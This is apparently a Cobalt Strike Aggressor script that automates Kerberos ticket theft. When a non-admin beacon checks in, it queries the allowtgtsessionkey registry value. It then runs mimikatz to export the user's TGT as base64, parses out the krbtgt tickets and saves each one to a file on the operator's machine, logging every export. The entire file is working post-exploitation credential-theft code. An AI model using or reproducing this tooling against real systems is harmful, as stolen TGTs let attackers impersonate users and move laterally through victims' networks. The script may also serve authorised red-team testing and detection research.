global('@exportedUsers');
@exportedUsers = @();

sub grabTGT {
    bmimikatz($1,"standard::base64 /output:true\nkerberos::list /export");
}

sub parseMimikatz {

    $kerbTickets = $1;
    $allTickets = "";
    $cont = 1;
    while ( $cont == 1 )
    {
        try
        {
            $ticketStartIndex = indexOf($kerbTickets, "krbtgt/");
            if ( $ticketStartIndex is $null )
            {
                $cont = 0;
                break;
            }
            $tempTickets = substr($kerbTickets, 0, $ticketStartIndex);
            $metadataStartIndex = lindexOf($tempTickets, "Start");

            $ticket = substr($kerbTickets, $metadataStartIndex);
            $metadataEndIndex = indexOf($ticket, "====================");
            $metadata = substr($ticket, 0, $metadataEndIndex);

            # Remove current ticket from master ticket list to avoid infinite loop
            $kerbTickets = substr($kerbTickets, $ticketStartIndex + 8);

            $ticketStartIndex = indexOf($ticket, "====================");
            $ticket = substr($ticket, $ticketStartIndex + 20);   # Remove everything before first break

            $ticketStartIndex = indexOf($ticket, "====================");
            $ticket = substr($ticket, $ticketStartIndex + 20);   # Remove everything before second break

            $ticketEndIndex = indexOf($ticket, "====================");
            $ticket = substr($ticket, 0, $ticketEndIndex);   # Grab everything up until the final break

            $allTickets = "$allTickets\nTGT Metadata:";
            $allTickets = "$allTickets\n$metadata";
            $allTickets = "$allTickets\nNote: Current Local Time is " . dstamp(ticks());
            $allTickets = "\n$allTickets\nBase64 encoded Kerberos TGT ticket: ";
            $allTickets = "$allTickets\n$ticket\n";
        }
        catch $message 
        { 
            println("WARNING: Unable to obtain ticket\nERROR: $message");
            println(getStackTrace()); 
        }
    }
    return $allTickets;
}

on beacon_initial {
    $username = binfo($1, "user");
    $hostname = binfo($1, "computer");

    # this will force Cobalt Strike to only grab user's TGT if in low-priv context.  If beacon is in high integrity, then running mimikatz sekurlsa::logonpasswords will be significantly more effective
    if ( -isadmin $1 )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("RESULT: skipping because beacon is in Administrative Context");
    }
    # this will force Cobalt Strike to only grab users's TGT once, helpful if spawning new beacons as that user.  Comment out if you need to grab TGT EVERYTIME beacon comes in.
    else if ( $username in @exportedUsers )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("RESULT: skipping because user's TGT has already been Exported.");
    }
    else
    {
        #bpowershell($1, '((gp HKLM:System\CurrentControlSet\Control\Lsa\Kerberos\Parameters).allowtgtsessionkey)');
        bshell($1, 'reg query HKLM\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters');
    }
}

on beacon_output {
    # setup constants to search in beacon output
    $checkRegKeySuccess = "allowtgtsessionkey    REG_DWORD    0x1";
    $checkRegKeyFail = "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters";

    $exportTGTsuccess = "isBase64InterceptOutput is true";

    # grab beacon metadata for event logging
    $username = binfo($1, "user");
    $pid = binfo($1, "pid");
    $hostname = binfo($1, "computer");

    if ( $checkRegKeySuccess isin $2 )
    {
        grabTGT($1)
    }
    else if ( $checkRegKeyFail isin $2 )
    {
        println("\nHost: $hostname");
        println("User: $username");
        println("Result: UNABLE TO OBTAIN TGT - allowtgtsession registry value not set"); 
    }
    else if ( $exportTGTsuccess isin $2 )
    {
        $fileName = "ExportedTGT_" . $username . ".txt";

        println("\nHost: $hostname");
        println("User: $username");

        $beaconOutput = replace($2, 'received output:\n'.'');
        $tgtTickets = parseMimikatz($beaconOutput);

        # Save ticket locally to Cobalt Strike Operator's host
        $handle = openf("> $fileName");
        println($handle, $tgtTickets);
        closef($handle);

        add(@exportedUsers, $username);

        println("Result: SUCCESSFULLY EXPORTED TGT as $fileName"); 
        elog("EXPORTED TGT for $username on host $hostname with PID $pid" . ".  Saving as $fileName"); 
    }
}
